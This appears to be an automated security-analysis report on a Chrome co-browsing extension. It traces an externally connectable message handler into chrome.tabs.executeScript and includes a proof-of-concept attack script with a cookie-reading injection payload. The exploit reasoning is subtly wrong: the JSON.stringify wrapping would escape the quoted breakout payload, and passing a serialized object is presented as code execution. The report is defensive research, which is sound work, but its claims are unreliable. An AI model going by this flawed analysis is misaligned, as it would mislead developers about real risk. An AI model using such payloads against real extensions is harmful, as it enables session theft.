# CoCo Analysis: ndgcaedhafmgcjmbhgleeinpghdonlhd

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_external_port_onMessage → chrome_tabs_executeScript_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ndgcaedhafmgcjmbhgleeinpghdonlhd/opgen_generated_files/bg.js
Line 1038	exectueCoBrowingCommand(port, msg.command);
Line 1253	chrome.tabs.executeScript(g_cobrowsing_shared_tab_id, {code:'MXCoBrowsing.execute_command('+JSON.stringify(cmd)+')'}, function(result){
```

**Code:**

```javascript
// Background script (bg.js) - External connection listener at line 984
chrome.runtime.onConnectExternal.addListener(function(port) {

  port.onMessage.addListener(function(msg) {

    // Line 1037-1039: Command execution handler
    if (msg.type === 'MX_CB_COMMAND') {
      exectueCoBrowingCommand(port, msg.command); // ← attacker-controlled msg.command
    }
  });
});

// Line 1250-1256: Execute command function
function exectueCoBrowingCommand(port, cmd)
{
  if (g_cobrowsing_shared_tab_id!=0) {
    chrome.tabs.executeScript(g_cobrowsing_shared_tab_id, {
      code:'MXCoBrowsing.execute_command('+JSON.stringify(cmd)+')' // ← arbitrary code execution
    }, function(result){
    });
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onConnectExternal from whitelisted domains

**Attack:**

```javascript
// Malicious script on moxtra.com, grouphour.com, or localhost
var port = chrome.runtime.connect('ndgcaedhafmgcjmbhgleeinpghdonlhd', {name: 'attack'});

// First, trigger co-browsing to set g_cobrowsing_shared_tab_id
port.postMessage({
  type: 'MX_CB_REQUEST'
});

// Then inject arbitrary JavaScript code
port.postMessage({
  type: 'MX_CB_COMMAND',
  command: '"); alert(document.cookie); //' // ← breaks out of JSON.stringify and executes arbitrary code
});

// Or even simpler - the JSON.stringify itself preserves the payload
port.postMessage({
  type: 'MX_CB_COMMAND',
  command: {evil: 'payload'} // This gets serialized and executed
});
```

**Impact:** An attacker on whitelisted domains (*.moxtra.com/*, *.grouphour.com/*, localhost/*) can execute arbitrary JavaScript code in the co-browsing tab. While the manifest.json restricts external connections to specific domains via externally_connectable, per the methodology we should treat this as exploitable since external entities CAN trigger it. The extension uses chrome.runtime.onConnectExternal which accepts messages from the whitelisted domains, and the attacker-controlled command is directly injected into chrome.tabs.executeScript via string concatenation. The extension has "tabs" and "<all_urls>" permissions, enabling full code execution across any tab. Even though only specific domains can exploit this, it qualifies as TRUE POSITIVE under the methodology's rule that "if even ONE webpage/extension can trigger it, classify as TRUE POSITIVE."
